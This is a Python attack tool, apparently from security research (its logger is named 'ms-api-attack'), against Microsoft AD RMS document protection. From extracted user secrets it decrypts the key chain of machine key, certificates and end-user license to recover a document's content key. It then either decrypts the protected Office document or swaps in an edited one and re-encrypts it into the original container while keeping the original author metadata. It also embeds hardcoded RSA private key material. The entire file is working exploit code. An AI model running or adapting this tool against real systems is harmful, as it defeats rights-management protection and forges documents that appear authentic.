from os import path
import xml.etree.ElementTree as ET
import binascii
import base64
import struct
import logging
from typing import Tuple
import zipfile
from Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import logging
import argparse
import json
import olefile
import zipfile
import io
import os
import tempfile
import clr
import sys

rsaVault_n_bytes = binascii.unhexlify(
    "cde6d3bf18ddf35009f5514dffac6f33d56aeb3e10e55298efa80c3996888c4c51b9439d6a3b720d48f7b42cd936c04a79c54cb3629f93c682c34e3ecef419d5c8809340f48cec9c068d9a024dc4d41d3bb927282f14d308756ef6f24abb069cf6610a6dc831bd093ff203cf564de239020a18f3f63b29cf86584416b047c5dc"
)
rsaVault_d_bytes = binascii.unhexlify(
    "43a915a90f337a82b6478022f41716275c12e12770d197394b395f84f38a8aa1a61360126ca72ee1e2efd499c446f8bd389729c566dfaef18675a363448336eab98da174fcfd05a59d2915de0262541fa378a1444c5818a3b72abcfca12e2f6fa4d1e8581684c11a5ffd5c508a084e0fe8a87bcf7ff88e1e01b9c1137e231d64"
)

rsaVault_n = int.from_bytes(rsaVault_n_bytes, byteorder="big")
rsaVault_d = int.from_bytes(rsaVault_d_bytes, byteorder="big")
def read_in_file(path: str, chunksize: int) -> bytes:
    with open(path, "rb") as infile:
        read = ""
        chunk = ""
        while True:
            chunk = infile.read(chunksize)
            if len(chunk) == 0:
                break
            else:
                read += binascii.hexlify(chunk).decode("utf-8")
        return True, binascii.unhexlify(read)
    return False


def read_in_hex_file(path: str, chunksize: int) -> bytes:
    with open(path, "r") as infile:
        read = ""
        chunk = ""
        while True:
            chunk = infile.read(chunksize)
            if len(chunk) == 0:
                break
            else:
                read += chunk
        return True, binascii.unhexlify(read.strip())
    return False


def b64ToInt(b64String, bigEndian):
    if bigEndian:
        return int.from_bytes(base64.b64decode(b64String), byteorder="big")
    else:
        return int.from_bytes(base64.b64decode(b64String), byteorder="little")


def parse_slc_csp_private_key(path: str) -> Tuple[bool, RSA.RsaKey]:
    root = ET.parse(path).getroot()

    # get child nodes and decode base64
    mod_b64 = base64.b64decode(root[0].text)
    e_b64 = base64.b64decode(root[1].text)
    p_b64 = base64.b64decode(root[2].text)
    q_b64 = base64.b64decode(root[3].text)
    dp_b64 = base64.b64decode(root[4].text)
    dq_b64 = base64.b64decode(root[5].text)
    invD_b64 = base64.b64decode(root[6].text)
    d_b64 = base64.b64decode(root[7].text)

    # parse bytes to bigintegers
    mod = int.from_bytes((mod_b64), byteorder="big")
    e = int.from_bytes(e_b64, byteorder="big")
    p = int.from_bytes(p_b64, byteorder="big")
    q = int.from_bytes(q_b64, byteorder="big")
    dp = int.from_bytes(dp_b64, byteorder="big")
    dq = int.from_bytes(dq_b64, byteorder="big")
    invD = int.from_bytes(invD_b64, byteorder="big")
    d = int.from_bytes(d_b64, byteorder="big")

    return True, RSA.construct((mod, e, d, p, q), True)

def insert_enc_bytes_to_ole(enc_bytes, original_doc_path, suffix):
    sys.path.append('./helper-scripts/OpenMcdf/net40/')
    clr.AddReference('OpenMcdf')
    import OpenMcdf
    enc_mani_doc = OpenMcdf.CompoundFile(original_doc_path)
    enc_mani_doc.RootStorage.Delete('EncryptedPackage')
    enc_mani_doc.RootStorage.AddStream('EncryptedPackage').SetData(enc_bytes)
    enc_mani_doc.Save('mani_doc'+suffix)
    logger.info('Succesfully created document')

def encrypt_aes_bytes_to_file(
    key, dec_bytes, out_filename=None, chunksize=16, original_size=0
):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    decryptor = AES.new(key, AES.MODE_ECB)
    with open(out_filename, "wb") as outfile:
        logger.debug(original_size)
        pad = 0
        if (len(dec_bytes) % chunksize) != 0:
            pad = 16 - (len(dec_bytes) % chunksize)
            for i in range(pad):
                dec_bytes += binascii.unhexlify("00")

        logger.debug("[encrypt_aes_bytes_to_file] padding bytes: " + str(pad))
        logger.debug("[encrypt_aes_bytes_to_file] final size]: " + str(len(dec_bytes)))
        logger.debug(
            "[encrypt_aes_bytes_to_file] bytes to encrypt]: "
            + str(binascii.hexlify(dec_bytes))
        )
        enc_bytes = decryptor.encrypt(dec_bytes)
        size = struct.pack("<Q", len(dec_bytes) - pad)
        bytes_to_write = size + enc_bytes

        logger.debug(
            "[encrypt_aes_bytes_to_file] encrypted bytes: "
            + str(binascii.hexlify(bytes_to_write))
        )
        outfile.write(bytes_to_write)
        
    return bytes_to_write, check_for_office_type(dec_bytes)

def substiute_author_xml(path):
    tmpfd, tmpname = tempfile.mkstemp(dir='output/')
    os.close(tmpfd)
    # create a temp copy of the archive without filename            
    with zipfile.ZipFile(path, 'r') as zin:
        with zipfile.ZipFile(tmpname, 'w') as zout:
                zout.comment = zin.comment # preserve the comment
                for item in zin.infolist():
                    if item.filename != 'docProps/core.xml':
                        zout.writestr(item, zin.read(item.filename))

    # replace with the temp archive
    new_name = 'output/'+'dec_doc_mani_auth.'+path.split('.')[-1]
    os.rename(tmpname, new_name)
    file = open('output/docProps/core.xml')
    data = file.read()
    file.close()
    # now add filename with its new data
    with zipfile.ZipFile(new_name, mode='a') as zf:
        zf.writestr('docProps/core.xml', data)
    
    return new_name

def decrypt_aes_bytes_to_file(key, enc_bytes, out_filename=None, chunksize=16, size=0):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]
    decryptor = AES.new(key, AES.MODE_ECB)
    dec = decryptor.decrypt(enc_bytes)
    out_filename = out_filename + check_for_office_type(dec)
    with open(out_filename, "wb") as outfile:
        if size != 0:
            dec = dec[:size]
            # dec = dec
        logger.debug(
            "[decrypt_aes_bytes_to_file] decrypted bytes: "
            + str(binascii.hexlify(dec))
        )
        outfile.write(dec)
    if check_for_office_type(dec) is not None:
        try:
            zip =  zipfile.ZipFile(io.BytesIO(dec),'r')
            zip.extract('docProps/core.xml','output/')
            zip.close()
        except zipfile.BadZipFile as err:
            logger.error("Couldn open document")
            logger.error(err)
            exit(1)
    return out_filename       

def check_for_office_type(bytes):
    try:
        zip = zipfile.ZipFile(io.BytesIO(bytes),'r')
        if zipfile.Path(zip,'word/').exists():
            return '.docx'
        if zipfile.Path(zip,'ppt/').exists():
            return '.pptx'
        if zipfile.Path(zip,'xl/').exists():
            return '.xlsx'
    except zipfile.BadZipFile:
        logger.error("Office Document is not a valid zip file")
        exit(1)
    return None
# maximum size currently is 2048 bit for RSA machine private keys
# we assume SHA-256 as hash algorithm
def decrypt_and_parse_spc_mk(
    enc_mk_path: str, sk_hash: str, chunksize=16 * 256
) -> bytes:
    sk_hash = binascii.unhexlify(sk_hash)

    # read in encrypted mk bytes
    enc_mk_bytes = read_in_hex_file(enc_mk_path, chunksize)

    if enc_mk_bytes[0] != True or len(enc_mk_bytes[1]) == 0:
        logger.error(
            "Error: Could not read in any byte from unprotected Machine key file:"
            + enc_mk_path
        )
        exit(1)
    else:
        enc_mk_bytes = enc_mk_bytes[1]

    logger.debug(binascii.hexlify(enc_mk_bytes).decode('utf-8'))

    if binascii.hexlify(enc_mk_bytes).decode("utf-8").find("0702000000A40000") != -1:
        logger.error(
            "Error: Could find header bytes 0702000000A40000 in unprotected Machine key file:"
            + enc_mk_path
        )
        exit(1)

    # we use blockMode = 5 for standard CBC, 2-4 maybe implemented, when we see cbc-512 or 4k
    # strip the 8 header bytes from the encrypted mk
    return decrypt_sealed_key(enc_mk_bytes[8:], sk_hash, 16, 16, 5)


# read sk and mk from json. Generate HashValue from sk and decrypt mk. This function is build as decrypt_and_parse_spc_mk clon
def decrypt_and_parse_spc_mk_from_json(sk_mk_json_path: str) -> bytes:
    try:
        file = open(
            sk_mk_json_path,
        )
        json_data = json.load(file)
        sk_value = json_data["Sk"]
        mk_value = json_data["Mk"]
        # make everything to Uppercase, cause of translating into bytes
        sk_value = sk_value.upper()
        mk_value = mk_value.upper()
        mk_enc_bytes = bytes.fromhex(mk_value)
        sk_bytes = bytes.fromhex(sk_value[:96])
        logger.debug("Sk Hash Input"+str(sk_bytes))
        logger.debug("MK enc Bytes: ")
        logger.debug(mk_enc_bytes)
        logger.debug("SK bytes: ")
        logger.debug(sk_bytes)
    except OSError as error:
        logger.error("Operatingsystem Error: " + error)
        exit(1)

    hash_object = SHA256.new(sk_bytes)
    logger.debug("Sk hash"+str(hash_object.hexdigest()))
    sk_derived_aes_key = hash_object.hexdigest()[:32]
    sk_derived_aes_key = binascii.unhexlify(sk_derived_aes_key)
    logger.debug("SK derived AES key: " + str(sk_derived_aes_key))

    # we use blockMode = 5 for standard CBC, 2-4 maybe implemented, when we see cbc-512 or 4k
    # strip the 8 header bytes from the encrypted mk
    logger.debug("SK Hash Value: "+str(sk_derived_aes_key))
    return decrypt_sealed_key(mk_enc_bytes[8:], sk_derived_aes_key, 16, 16, 5)


def decrypt_and_parse_enabling_bits(
    enabits: bytes,
    recipient_rsa_key: RSA.RsaKey,
    isLicense: bool,
    keySize,
    pkcs1v15: bool,
) -> bytes:
    # source: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rmpr/0af4de27-b747-4aff-8daf-de4b3ee274b3
    # KPublic(KeyHeader & KSession) + KSession(EnablingBitsHeader + (KeyHeader & K) + Hash)
    # K can be a symmetric or an asymmetric key, depending on the use case
    # use/publishing license
    #           -> symmetric
    # cert (rac, clc, spc)
    #           -> asymmetric
    chunksize = int(keySize / 8)
    enc_session_key_bytes = enabits[:chunksize]
    logger.debug(
            "[decrypt_and_parse_enabling_bits]\t enc session key bytes: "
            + str(binascii.hexlify(enc_session_key_bytes))
            + "\n\n"
        )

    enc_sealed_key_bytes = enabits[chunksize:]
    logger.debug(
            "[decrypt_and_parse_enabling_bits]\t enc sealed key bytes: "
            + str(binascii.hexlify(enc_sealed_key_bytes))
            + "\n\n"
        )

    dec_session_key_bytes = decrypt_enablingbits_session_key(
        enc_session_key_bytes, recipient_rsa_key, pkcs1v15
    )

    keySize, blockSize, blockMode, sessionKey = parse_symmetric_key(
        dec_session_key_bytes
    )

    dec_sealed_key_bytes = decrypt_sealed_key(
        enc_sealed_key_bytes, sessionKey, keySize, blockSize, blockMode
    )

    logger.debug(
            "[decrypt_and_parse_enabling_bits]\t Dec Sealed Key Bytes: "
            + str(binascii.hexlify(dec_sealed_key_bytes))
            + "\n\n"
        )

    key = parse_sealed_key(dec_sealed_key_bytes, isLicense)

    return key


def decrypt_enablingbits_session_key(
    enc_session_key_bytes: bytes, rsa_key: RSA.RsaKey, pkcs1v15: bool
) -> bytes:
    if pkcs1v15:
        cipher = PKCS1_v1_5.new(rsa_key)
        logger.debug(
            "[decrypt_enablingbits_session_key]\t enc_session_key_bytes: "
            + str(binascii.hexlify(enc_session_key_bytes))
            + "\n\n"
        )
        dec_session_key_bytes = cipher.decrypt(enc_session_key_bytes, 1)
    else:
        cipher = PKCS1_OAEP.new(rsa_key)
        logger.debug(
            "[decrypt_enablingbits_session_key]\t enc_session_key_bytes: "
            + str(binascii.hexlify(enc_session_key_bytes))
            + "\n\n"
        )
        dec_session_key_bytes = cipher.decrypt(enc_session_key_bytes)

    if dec_session_key_bytes == 1:
        logger.error("Error: Could not decrypt session key with RSA private key" + "\n\n")
        exit(1)
    return dec_session_key_bytes


def decrypt_sealed_key(
    enc_sealed_key_bytes: bytes,
    sessionKey: bytes,
    keySize: int,
    blockSize: int,
    blockMode: int,
) -> bytes:
    # K_Session(EnablingBitsHeader + (KeyHeader & K) + Hash)
    logger.debug("[decrypt_sealed_key]\t " + str(sessionKey) + "\n\n")

    # use AES ECB if blockMode is 1
    decryptor = AES.new(sessionKey, AES.MODE_ECB)
    # for blockMode = 2 to 4 I have no clue how the CBC-4k or CBC-512 should work
    # never saw it in an implementation, so we try standard CBC
    if blockMode != 1:
        aes_iv = binascii.unhexlify("00000000000000000000000000000000")
        decryptor = AES.new(sessionKey, AES.MODE_CBC, aes_iv)
    dec_key = decryptor.decrypt(enc_sealed_key_bytes)
    logger.debug(
        "[decrypt_sealed_key]\t Decrypted sealed key:"
        + str(binascii.hexlify(dec_key).decode("utf-8"))
        + "\n\n"
    )
    return dec_key


def parse_rsa_key(rsa_priv_key_bytes: bytes, keysize: int) -> Tuple[bool, RSA.RsaKey]:
    # source: https://docs.microsoft.com/de-de/windows/win32/seccrypto/base-provider-key-blobs#private-key-blobs
    # source: https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/ns-wincrypt-rsapubkey

    logger.debug(
        "[parse_rsa_key]\t Parsing decrypted and unprotected machine private key: "
        + str(binascii.hexlify(rsa_priv_key_bytes))
        + "\n"
    )

    # parse mod
    cur_p = 0
    nex_p = 0
    rsa_values = []
    for i in range(7):
        if i == 0 or i == 6:
            nex_p = nex_p + int((keysize / 8))
        else:
            nex_p = nex_p + int(keysize / 16)
        logger.debug(
            "[parse_rsa_key]\t Current: "
            + str(cur_p)
            + " \t next: "
            + str(nex_p)
            + "\n"
            + "\n ".join(map(str, rsa_values))
        )
        rsa_values.append(
            int.from_bytes((rsa_priv_key_bytes[cur_p:nex_p]), byteorder="little")
        )
        cur_p = nex_p

    logger.debug("[parse_rsa_key]\t mod:" + str(rsa_values[0]) + "\n")
    logger.debug("[parse_rsa_key]\t p:" + str(rsa_values[1]) + "\n")
    logger.debug("[parse_rsa_key]\t q:" + str(rsa_values[2]) + "\n")
    logger.debug("[parse_rsa_key]\t dp:" + str(rsa_values[3]) + "\n")
    logger.debug("[parse_rsa_key]\t dq:" + str(rsa_values[4]) + "\n")
    logger.debug("[parse_rsa_key]\t invQ:" + str(rsa_values[5]) + "\n")
    logger.debug("[parse_rsa_key]\t d:" + str(rsa_values[6]) + "\n")

    mod_parsed = rsa_values[0]
    mod_new = rsa_values[1] * rsa_values[2]
    if mod_new == mod_parsed:
        logger.debug("[parse_rsa_key]\t Modulus is equal p*q")
        return True, RSA.construct(
            (mod_new, 65537, rsa_values[6], rsa_values[1], rsa_values[2]), True
        )
    else:
        logger.error(
            "Error: Modulus is NOT equal p*q \n I got mod: "
            + str(mod_parsed)
            + ", p*q: "
            + str(mod_new)
        )
        return False, ""


# source: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rmpr/4b093a0a-a16f-4f11-9866-eca874b1598a
def parse_sealed_key(dec_sealed_key: bytes, isLicense: bool) -> bytes:
    # EnablingBitsHeader + (KeyHeader & K) + Hash
    ret, version, size = parse_enabling_bits_header(dec_sealed_key[:16])
    logger.debug("[parse_sealed_key]\t " + "isLicense: " + str(isLicense))
    logger.debug("[parse_sealed_key]\t " + "version: " + str(version[0]))
    if ret and (version[0] == 1 or version[0] == 2):
        size = size[0]
        if isLicense:
            (
                sessionKeySizeInBytes,
                sessionKeyBlockSizeInBytes,
                blockMode,
                sessionKeyInBytes,
            ) = parse_symmetric_key(dec_sealed_key[16:])
            return sessionKeyInBytes
        else:
            logger.debug(
                "[parse_sealed_key]\t "
                + str(binascii.hexlify(dec_sealed_key[16:]))
            )
            parse_rsa_key_header_1(dec_sealed_key[16:24])  # TODO: implement
            rsa_key_bytes, rsa_keySize, exponent = parse_rsa_key_header_2(
                dec_sealed_key[24:]
            )  # TODO: implement
            ret, rsa_key = parse_rsa_key(rsa_key_bytes, rsa_keySize)  # TODO: implement
            if ret:
                return rsa_key
            else:
                logger.error("Error: Could not get RSAKey, abort now!")
                exit(1)
    else:
        logger.error(
            "Error: Parsing Enabling Bits Header failed! "
            + str(binascii.hexlify(dec_sealed_key[:16]))
        )


def parse_enabling_bits_header(enabits_header: bytes) -> Tuple[bool, bytes, bytes]:
    # source: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rmpr/4b093a0a-a16f-4f11-9866-eca874b1598a
    logger.debug(
        "[parse_enabling_bits_header]\t "
        + binascii.hexlify(enabits_header).decode("utf-8")
        + "\n\n"
    )
    if len(enabits_header) == 16:
        version = struct.unpack("<HH", enabits_header[:4])
        size = struct.unpack("<HH", enabits_header[4:8])
        reserved = struct.unpack("<HH", enabits_header[8:12])
        reserved2 = struct.unpack("<HH", enabits_header[12:16])
        logger.debug("[parse_enabling_bits_header] Version:\t" + str(version[0]))
        logger.debug("[parse_enabling_bits_header] Size:\t" + str(size[0]))
        logger.debug("[parse_enabling_bits_header] R1:\t" + str(reserved[0]))
        logger.debug("[parse_enabling_bits_header] R2:\t" + str(reserved2[0]))
        return True, version, size
    else:
        logger.error("Error: EnablingBitsHeader has wrong length")
        return False, b"", b""


def parse_rsa_key_header_1(rsaKeyHeader: bytes) -> bool:
    # source: https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/ns-wincrypt-publickeystruc
    # RAW Bytes: 0702000000240000
    # Parsed Bytes:
    #   07    	    bType - 0x7 (PRIVATEKEYBLOB)
    #   02 	    bVersion - 0x2 (CUR_BLOB_VERSION)
    #   0000 	    reserved - 0x0000
    #   00240000    aiKeyAlg -  0x00002400 (CALG_RSA_SIGN) (https://docs.microsoft.com/de-de/windows/win32/seccrypto/alg-id)
    rsaType = struct.unpack("<b", rsaKeyHeader[:1])[0]
    if rsaType != 7:
        logger.error(
            "Error: Expected PrivateKeyBlob (type 7), got:"
            + str(rsaType)
            + " abort now"
        )
        exit(1)
    logger.debug("[parse_rsa_key_header_1]\t " + "rsaType:" + str(rsaType))
    version = struct.unpack("<b", rsaKeyHeader[1:2])[0]
    if version != 2:
        logger.error("Error: Expected version 2, got:" + str(version) + " abort now")
        exit(1)
    logger.debug("[parse_rsa_key_header_1]\t " + "version:" + str(version))

    reserved = struct.unpack("<H", rsaKeyHeader[2:4])[0]
    if reserved != 0:
        logger.error("Error: Expected reserved bytes 0, got:" + str(reserved) + " abort now")
        exit(1)
    algID = binascii.hexlify(rsaKeyHeader[4:8]).decode("utf-8")
    if algID != "00240000":
        logger.error("Error: Expected algID bytes 0, got:" + str(algID) + " abort now")
        exit(1)
    logger.debug("[parse_rsa_key_header_1]\t " + "AlgorithmID: " + str(algID))
    return True


def parse_rsa_key_header_2(dec_mk_data: bytes) -> Tuple[bytes, int, int]:
    # source: https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/ns-wincrypt-rsapubkey
    # raw: 525341320008000001000100 -> 0x52534132 0x00080000 0x01000100
    # parsed:
    # 0x52534132 is little endian for 'RSA2' in ascii
    # 0x00080000 big endian -> 0x00000800 little endian -> 2048 bit modulus size
    # 0x01000100 big endian -> 0x00010001 little endian -> 65537 exponent e

    keyTypeTuple = struct.unpack("<ssss", dec_mk_data[:4])
    keyType = ""
    for i in range(4):
        keyType += keyTypeTuple[i].decode("utf-8")
    if keyType != "RSA2":
        logger.error("Error: RSA1 key not implemented")
        exit(1)
    logger.debug("[parse_rsa_key_header_2]\t " + "keyType: " + keyType)

    keySize = struct.unpack("<I", dec_mk_data[4:8])[0]
    logger.debug("[parse_rsa_key_header_2]\t " + "keySize: " + str(keySize))
    if keySize != 1024 and keySize != 2048:
        logger.error(
            "Error: RSA keySize is not 1024 or 2048, got: "
            + str(keySize)
            + " abort now"
        )
        exit(1)

    exponent = struct.unpack("<I", dec_mk_data[8:12])[0]
    logger.debug("[parse_rsa_key_header_2]\t " + "exponent: " + str(exponent))
    if exponent != 65537:
        logger.error("Error: RSA exponent is not 65537, got: " + str(exponent) + " abort now")
        exit(1)

    # parse PKCS#7 padding

    # get padding size
    pad = int(struct.unpack("<b", dec_mk_data[-1:])[0])
    logger.debug("[parse_rsa_key_header_2]\t " + "pad: " + str(pad))
    if pad != 0:
        # check if padding is consistent
        for i in range(1, pad):
            p = dec_mk_data[i * -1]
            logger.debug("[parse_rsa_key_header_2]\t " + "pad: " + str(pad))
            if p != pad:
                msg = binascii.hexlify(dec_mk_data[pad * -1 :]).decode("utf-8")
                logger.error("Error: padding of RSA key is not correct! got: " + msg)
                exit(1)
        # remove header and padding
        logger.debug(
            "[parse_rsa_key_header_2]\t "
            + "keybytes: "
            + str(dec_mk_data[12 : pad * -1])
        )
        return dec_mk_data[12 : pad * -1], keySize, exponent
    else:
        logger.debug(
            "[parse_rsa_key_header_2]\t "
            + "keybytes: "
            + str(dec_mk_data[12:])
        )
        return dec_mk_data[12:], keySize, exponent


def parse_symmetric_key(dec_session_key: bytes) -> Tuple[int, int, int, bytes]:
    # source: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rmpr/0af4de27-b747-4aff-8daf-de4b3ee274b3
    logger.debug(
        "[parse_symmetric_key]\t "
        + "\n\nStart parsing Key Header: "
        + binascii.hexlify(dec_session_key).decode("utf-8")
    )

    ##### Get the size of the whole decrypted payload #####
    # first 2 bytes are little endian unsigned short size of the payload
    # Example:
    #           sessionKeyBlobSize = struct.unpack('<H',binascii.unhexlify('1c00') )
    sessionKeyBlobSizeBytes = dec_session_key[:2]
    # returns a tuple (XX,), so we need the first entry [0]
    sessionKeyBlobSize = struct.unpack("<H", sessionKeyBlobSizeBytes)[0]

    ##### Get the Block Mode #####
    blockModeInHex = binascii.hexlify(dec_session_key[2:4]).decode("UTF-8")
    if blockModeInHex == "ffff":
        blockMode = 1
        logger.debug("[parse_symmetric_key]\t " + "Block Mode: ECB")
    elif blockModeInHex == "fffe":
        blockMode = 2
        logger.debug("[parse_symmetric_key]\t " + "Block Mode: CBC 4k No Pad")
    elif blockModeInHex == "fffd":
        blockMode = 3
        logger.debug("[parse_symmetric_key]\t " + "Block Mode: CBC 4k with Pad")
    elif blockModeInHex == "fffc":
        blockMode = 4
        logger.debug("[parse_symmetric_key]\t " + "Block Mode: CBC 512 No Pad")
    else:
        logger.error(
            "Error: Could not identify the block mode of the sealed key block: "
            + str(binascii.hexlify(dec_session_key))
            + ", abort now!"
        )
        exit(1)

    ##### Get the Key Session Size in Bytes #####
    # Example:
    #           sessionKeySizeInBytes = struct.unpack('<H',binascii.unhexlify('1000') )
    sessionKeySizeInBytes = struct.unpack("<H", dec_session_key[4:6])[0]
    logger.debug(
        "[parse_symmetric_key]\t "
        + "sessionKeySizeInBytes: "
        + str(sessionKeySizeInBytes)
    )

    ##### Get the Block Size in Bytes #####
    # Example:
    #           keySizeInBytes = struct.unpack('<H',binascii.unhexlify('1000') )
    sessionKeyBlockSizeInBytes = struct.unpack("<H", dec_session_key[6:8])[0]
    logger.debug(
        "[parse_symmetric_key]\t "
        + "sessionKeyBlockSizeInBytes: "
        + str(sessionKeyBlockSizeInBytes)
    )

    ##### Get the FLAGS field #####
    # currently I am not quite sure, how this one is parsed
    # the documentation is not equal to the values I see in enablingbits PL, RAC, etc.

    ##### Get the session key bytes #####
    # sessionKeyInBytes = dec_session_key[-sessionKeySizeInBytes:]
    sessionKeyInBytes = dec_session_key[12 : 12 + sessionKeySizeInBytes]
    logger.debug(
        "[parse_symmetric_key]\t "
        + "SessionKeyBytes: "
        + binascii.hexlify(sessionKeyInBytes).decode("utf-8")
    )
    return (
        sessionKeySizeInBytes,
        sessionKeyBlockSizeInBytes,
        blockMode,
        sessionKeyInBytes,
    )


if __name__ == "__main__":
    #Logging
    logger = logging.getLogger("ms-api-attack")
    numeric_level = getattr(logging, "INFO", None)
    logging.basicConfig(
    level=numeric_level, 
    format='%(asctime)s:%(levelname)s:%(message)s',
    datefmt='%I:%M',
    handlers=[
        logging.StreamHandler(),
    ])
    logger.setLevel(level=numeric_level)
    # create Logger directory
    if not os.path.exists('log/'):
        os.mkdir('log')
    parser = argparse.ArgumentParser()
    subparser = parser.add_subparsers(
        help='Choose which mode you want to use. Decrypt extract and decrypt the package from an AD RMS protected document. Encrypt insert a manipulated document and decrypt it.',
        dest='command'
    )
    # Global parameters
    parser.add_argument(
        "--debug", required=False, action="store_true", help="Debug Output"
    )
    parser.add_argument(
        "-smk",
        "--sk-mk-path",
        dest="sk_mk_path",
        required=False,
        type=str,
        help="Path to the .json File which contains the unprotected sk and mk value for the user",
    )
    parser.add_argument(
        "-docpath",
        "--document-path",
        dest="dec_doc_path",
        required=True,
        type=str,
        help="Path to the document which will be decrypted.",
    )
    #Decrypt parameters
    parser_decrypt = subparser.add_parser(
        'decrypt',
        help='Decryptes an AD RMS protected doument and creates the unprotected office document.'
    )
    #Encrypt parameters
    parser_encrypt = subparser.add_parser(
        'encrypt',
        help='Encrypts an office document and inserts it into the specified document. You can exchange different office document types.'
    )
    parser_encrypt.add_argument(
        "-i",
        "--input",
        dest="input",
        required=False,
        type=str,
        help="Path to the document which will be encrypted and is potentiel modified by you",
    )
    args = parser.parse_args()
    if not args.command:
        parser.parse_args(['--help'])
        sys.exit(0)
    sk_mk_path = args.sk_mk_path
    doc_path = args.dec_doc_path
    if doc_path:
        file_handler = logging.FileHandler(
            'log/{0}.log'.format(doc_path)
        )
        file_handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(message)s'))
        logger.addHandler(file_handler)
    if args.debug:
        logger.setLevel(logging.DEBUG)

    keysize = 2048
    pkcs1v15 = False
    slc_path = "input/slc.xml"
    mk_unprotected_path = "processed/mk-unprotected.hex"
    sk_unprotected_path = "processed/sk-unprotected.hex"
    spc_modulus_path = "processed/CERT-Machine-2048.drm.xrml.modulus"
    sk_derived_aes_key_path = "processed/sk-aes-key.hex"
    sk_hash_input_path = "processed/sk-hash-input.hex"
    gic_ena_path = "processed/GIC.drm.xrml.enablingbits"
    clc_ena_path = "processed/CLC.drm.xrml.enablingbits"
    clc_ena_path = "processed/CLC.drm.xrml.enablingbits"
    eul_ena_path = "processed/EUL.drm.xrml.enablingbits"
    pl_ena_path = "processed/PL.drm.xrml.enablingbits"
    pl_erd_path = "processed/PL.drm.xrml.erd"
    enc_doc_path = "input/enc_doc"
    dec_doc_path = "output/dec_doc"
    enc_mani_doc_path = "output/enc_doc_mani"
    dec_mani_doc_path = "output/dec_doc_mani"
    sk_derived_aes_key = ""
    spc_modulus = ""
    # keysize / 4 = count of hex chars for modulus
    # Starting of the functionality
    logger.info('Starting of the %s process',args.command)
    spc_modulus_bytes = read_in_hex_file(spc_modulus_path, int(keysize / 4))
    if spc_modulus_bytes[0] != True:
        logger.error("Error: Could not read in spc_modulus")
        exit(1)
    else:
        logger.debug("[MAIN]\t " + str(spc_modulus_bytes[1].strip()))
        spc_modulus_bytes = spc_modulus_bytes[1]
    spc_modulus = int.from_bytes(spc_modulus_bytes, byteorder="little")
    logger.info("Parsing and decrypting SPC private key")
    if not sk_mk_path:
        # SK hash input is 48 byte -> 96 hex chars
        sk_hash_input = read_in_hex_file(sk_hash_input_path, 96)
        if sk_hash_input[0] != True:
            logger.error("Error: Could not read in sk_hash_input")
            exit(1)
        else:
            sk_hash_input = sk_hash_input[1]
        hash_object = SHA256.new(sk_hash_input)
        sk_derived_aes_key = hash_object.hexdigest()[:32]
        logger.debug(
            "[MAIN]\t " + "SK derived AES key: " + str(sk_derived_aes_key)
        )
        mk_plain = decrypt_and_parse_spc_mk(mk_unprotected_path, sk_derived_aes_key)
    else:
        mk_plain = decrypt_and_parse_spc_mk_from_json(sk_mk_path)
    logger.debug(binascii.hexlify(mk_plain))
    rsa_key_bytes, mk_key_size, exponent = parse_rsa_key_header_2(mk_plain)
    ret, mk_rsa_key = parse_rsa_key(rsa_key_bytes, mk_key_size)
    if ret:
        success, gic_enablingbits = read_in_hex_file(gic_ena_path, 16)
        if success == False:
            logger.error("Error: Could not read in GIC")
            exit(1)
        else:
            logger.info("Parsing and decrypting RAC EnablingBits Element")
        gic_priv_key = decrypt_and_parse_enabling_bits(
            gic_enablingbits, mk_rsa_key, False, 2048, pkcs1v15
        )

        success, clc_enablingbits = read_in_hex_file(clc_ena_path, 16)
        if success == False:
            logger.error("Error: Could not read in CLC")
            exit(1)
        else:
            logger.info("Parsing and decrypting CLC EnablingBits Element")
        clc_priv_key = decrypt_and_parse_enabling_bits(
            clc_enablingbits, gic_priv_key, False, 2048, pkcs1v15
        )

        success, eul_enablingbits = read_in_hex_file(eul_ena_path, 16)
        if success == False:
            logger.error("Error: Could not read in EUL")
            exit(1)
        else:
            logger.info("Parsing and decrypting EUL EnablingBits Element")
        content_key = decrypt_and_parse_enabling_bits(
            eul_enablingbits, gic_priv_key, True, 2048, pkcs1v15
        )
    if not doc_path:
        ret, enc_doc = read_in_file(enc_doc_path, 16)
        if ret != True:
            logger.error("Error: Could not read in encrypted document at " + enc_doc_path)
            exit(1)
    else:
        logger.debug("Open Document with python")
        try:
            with olefile.OleFileIO(doc_path) as document:
                enc_doc = document.openstream('EncryptedPackage').read()
        except IOError as error:
            logger.error("Couldn´t read the document with the path "+doc_path)
            logger.error(error)
            exit(1)
    size = struct.unpack("<HHHH", enc_doc[:8])
    size = size[0]
    # reserved = struct.unpack('<HH',enc_doc[4:8])
    logger.info(
        "Document Content Key is:" + binascii.hexlify(content_key).decode("utf-8")
    )
    logger.info("Document Key is:" + binascii.hexlify(content_key).decode("utf-8"))
    logger.debug("Document to decrypt:" + binascii.hexlify(enc_doc).decode("utf-8"))
    if args.command == 'decrypt':
        dec_doc_filename = decrypt_aes_bytes_to_file(content_key, enc_doc[8:], dec_doc_path, 16, size)
        logger.info('Edit file with location '+dec_doc_filename)
    # manipulate author
    if args.command == 'encrypt':
        logger.info('Starting the %s process', args.command)
        doc_path_dec = args.input
        if not doc_path_dec:
            logger.error("No path for document to decrypt. Please use --help")
            exit(1)
        logger.info('Encrypt document with path '+doc_path_dec)
        new_path = substiute_author_xml(doc_path_dec)
        ret, dec_doc_mani = read_in_file(new_path, 16)
        if ret != True:
            logger.error(
                "Error: Could not read in manipulated decrypted document at "
                + dec_mani_doc_path
            )
            exit(1)
        else:
            logger.info("Encrypt manipulated document")
        logger.info(
            "Document Content Key is:" + binascii.hexlify(content_key).decode("utf-8")
        )
        enc_bytes, suffix = encrypt_aes_bytes_to_file(
            content_key, dec_doc_mani, enc_mani_doc_path, 16, size
        )
        insert_enc_bytes_to_ole(enc_bytes,doc_path,suffix)
    logger.info('Finished the %s process', args.command)
